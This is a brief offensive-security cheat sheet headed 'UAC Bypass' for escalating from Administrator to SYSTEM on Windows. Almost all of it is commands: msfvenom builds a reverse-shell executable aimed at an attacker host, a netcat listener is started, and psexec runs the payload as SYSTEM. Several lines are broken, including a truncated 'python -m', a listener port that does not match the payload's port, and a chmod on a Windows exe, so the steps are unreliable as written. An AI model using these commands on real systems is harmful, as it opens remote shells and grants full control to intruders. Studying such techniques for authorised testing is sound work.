------------------------UAC Bypass ------------------------
UAC is not a security feature but that acts as a boundary when users want to perform privileged operations.

From Administrator to System:

> net user user                                      ----> to view users privileges and his group
# msfvenom –p windows/shell_reverse_tcp LHOST=IP LPORT=443 –f exe > reverse.exe
# chmod +x reverse.exe
# python -m

# nc –lvp 4444

> psexec.exe –i –d –accepteula –s  reverse.exe
